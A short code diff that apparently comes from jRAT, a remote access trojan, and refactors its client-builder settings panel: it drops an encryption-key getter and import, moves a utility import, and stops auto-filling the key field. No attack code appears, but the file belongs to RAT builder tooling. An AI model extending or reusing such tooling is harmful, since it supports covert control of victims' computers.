@@ -6,9 +6,8 @@ import io.jrat.client.net.PortListener;
 import io.jrat.client.settings.Settings;
 import io.jrat.client.ui.components.EncryptionKeyJTextField;
 import io.jrat.client.ui.components.PortListenerJComboBox;
-import io.jrat.client.utils.Utils;
 import io.jrat.common.crypto.Crypto;
-import io.jrat.common.crypto.EncryptionKey;
+import io.jrat.common.utils.Utils;
 
 import java.awt.Color;
 import java.awt.event.ActionEvent;
@@ -39,10 +38,6 @@ public class PanelBuildGeneral extends JPanel {
 
 	public String getPass() {
 		return new String(passPass.getPassword());
-	}
-
-	public EncryptionKey getKey() throws Exception {
-		return new EncryptionKey(txtKey.getText().trim());
 	}
 
 	public String getID() {
@@ -148,7 +143,6 @@ public class PanelBuildGeneral extends JPanel {
 		comboBox = new PortListenerJComboBox(new SocketComboBoxListener() {
 			@Override
 			public void onChange(PortListener pl) {
-				txtKey.setText(pl.getKey().getTextualKey());
 				passPass.setText(pl.getPass());
 			}
 		});
